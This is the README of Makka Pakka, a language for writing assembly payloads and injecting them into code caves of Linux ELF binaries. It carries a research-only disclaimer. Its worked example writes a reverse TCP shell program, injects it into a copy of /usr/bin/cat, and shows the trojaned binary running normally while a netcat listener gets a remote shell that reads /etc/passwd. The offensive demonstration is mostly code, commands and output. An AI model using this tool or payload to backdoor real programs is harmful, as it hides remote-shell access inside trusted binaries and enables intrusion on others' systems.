# Makka Pakka
Makka pakka is a programming language which transpiles into Intel assembly.
Makka pakka programs are specifically written to be embedded within a target
linux binary (ELF file). The language contains a submodule which autmatically
injects the compiled code into a
[code cave](https://en.wikipedia.org/wiki/Code_cave) of the target program.

To learn more, please visit the
[documentation page](https://lemon-bush-0f7dfc410.2.azurestaticapps.net/).

## Disclaimer
This project was created purely for research purposes. You do not have
permission to use this program for malicious code injection.

## Installation
__Makka pakka currently only runs on Ubuntu. Other Linux distributions may
have issues running the configure.sh script, and are not supported.__

Clone the repository:
``` bash
cd <your directory>
git clone https://github.com/PandasAreBears/MakkaPakka
```

Run the configure script:
``` bash
cd MakkaPakka
source configure.sh
```

At this point you should be able to Makka Pakka from with the project
directory:
``` bash
python3 mkpk.py --help
```

You may find it useful to install the program as an alias:
``` bash
sudo ln -s ${PWD}/mkpk.py /usr/local/bin/mkpk.py
echo "alias mkpk='python3 /usr/local/bin/mkpk.py'" >> ~/.bashrc
source ~/.bashrc
```

This will allow you to use the MakkaPakka like this:
``` bash
mkpk --help
```

## Example
Creating a Makka Pakka program file:
```
!link stdlib/network.mkpk
!link stdlib/syscall.mkpk
!link stdlib/execve.mkpk

[[data]]
exit_msg: "Connection Terminated"
# 5555 in little endian.
port: 0xb315
# 127.0.0.1 in little endian.
addr: 0x0100007f

[[code]]
[main]
> socket
> connect "addr" "port"
> dup2
> bin_sh
> sys_write "exit_msg" 22
> sys_exit
```

Compiling the Makka Pakka program into /usr/bin/echo:
```
mkpk reverse_tcp.mkpk /usr/bin/cat -e -o cat_inject
Injecting assembly from cat_inject.asm into cat_inject.
Injected file output to cat_inject.mkpk reverse_tcp.mkpk
```

Setting up a listener on localhost:5555:
```
nc -l localhost 5555
```

Then run the injected cat binary:
```
./cat_inject --help
Usage: ./cat_inject [OPTION]... [FILE]...
Concatenate FILE(s) to standard output.

With no FILE, or when FILE is -, read standard input.

  -A, --show-all           equivalent to -vET
  -b, --number-nonblank    number nonempty output lines, overrides -n
  -e                       equivalent to -vE
  -E, --show-ends          display $ at end of each line
  -n, --number             number all output lines
  -s, --squeeze-blank      suppress repeated empty output lines
  -t                       equivalent to -vT
  -T, --show-tabs          display TAB characters as ^I
  -u                       (ignored)
  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB
      --help     display this help and exit
      --version  output version information and exit

Examples:
  ./cat_inject f - g  Output f's contents, then standard input, then g's contents.
  ./cat_inject        Copy standard input to standard output.

GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
Report any translation bugs to <https://translationproject.org/team/>
Full documentation <https://www.gnu.org/software/coreutils/cat>
or available locally via: info '(coreutils) cat invocation'
```

Now the netcat listener has a remote TCP shell:
```
nc -l localhost 5555
whoami
alex
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin
alex:x:1000:1000:,,,:/home/alex:/bin/bash
```

For more examples, or a more detailed technical explaination, please check
out the
[documentation page](https://lemon-bush-0f7dfc410.2.azurestaticapps.net/).
